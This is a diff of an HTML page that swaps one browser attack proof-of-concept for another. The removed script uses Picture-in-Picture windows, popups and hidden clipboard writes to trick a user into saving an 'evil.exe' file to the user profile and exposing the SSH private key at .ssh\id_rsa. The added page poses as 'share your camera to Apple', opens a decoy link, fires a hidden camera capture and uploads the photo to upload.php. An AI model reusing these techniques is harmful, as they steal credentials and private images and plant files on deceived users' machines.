@@ -1,68 +1,62 @@
-<button onclick="start()">Click here</button>
-<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
-<pre id="contents"></pre>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+    h1 {
+        margin: 1em;
+    }
+
+    a {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
+
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
+</style>
+
+<h1>Tap to share your camera to Apple</h1>
+
+<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
+
+<img id="img" src="">
+<a id="link" href="https://google.com" target="_blank">Tap to open camera</a>
 
 <script>
-const fileWritePath = "%userprofile%\\\\evil.exe";
-const fileReadPath = "%userprofile%\\\\.ssh\\\\id_rsa";
+    document.getElementById('link').onclick = () => {
+        setTimeout(() => {
+            document.getElementById('fileSelect').click();
+        }, 600);
+    };
 
-async function loadFile(file) {
-  window.moveTo(0, 0);
-  window.resizeTo(500, 500);
-  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
-}
+    document.getElementById('fileSelect').onchange = (event) => {
+        const file = event.target.files[0];
+        if (file) {
+            const img = document.getElementById('img');
+            img.src = URL.createObjectURL(file);
 
-const pipOpen = async () => {
-  pipWindow = await documentPictureInPicture.requestWindow({
-    width: Math.pow(2,32),
-    height: Math.pow(2,32),
-  });
-  pipWindow.document.body.innerHTML = `
-  <button onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
-  <button onclick="read=true;eval(document.querySelector('script').innerText)">Start file reading game!</button>
-  <script>
-  copyToClipboard(read ? "${fileReadPath}" : "${fileWritePath}");
-  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
-  popup.resizeTo(200,200);
-  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
+            const formData = new FormData();
+            formData.append('file', file);
 
-  setTimeout(()=>
-    document.body.innerHTML = "<p>Press " + (read ? "enter, then " : "") + "ctrl+v and enter to win this game!</p>",
-    400
-  );
-
-  function copyToClipboard(text) {
-    const textarea = document.createElement("textarea");
-    textarea.style.opacity = "0%";
-    textarea.textContent = text;
-    document.body.appendChild(textarea);
-    textarea.select();
-    document.execCommand("copy");
-  }
-
-  <${'/'}script>
-  `;
-};
-
-function download(data, filename, type) {
-  const file = new Blob([data], {type: type});
-  const a = document.createElement("a");
-  const url = window.URL.createObjectURL(file);
-  a.href = url;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-}
-
-function start() {
-  pipOpen();
-}
-
-if (window.name == "popup-write") {
-  download("This is an evil executable", "harmless");
-  document.body.onfocus = () => setTimeout(() => window.close(), 1000);
-} else if (window.name == "popup-read") {
-  document.body.onkeydown = () => document.getElementById("upload").click();
-}
+            fetch('upload.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(result => {
+                console.log('Success:', result);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    };
 </script>
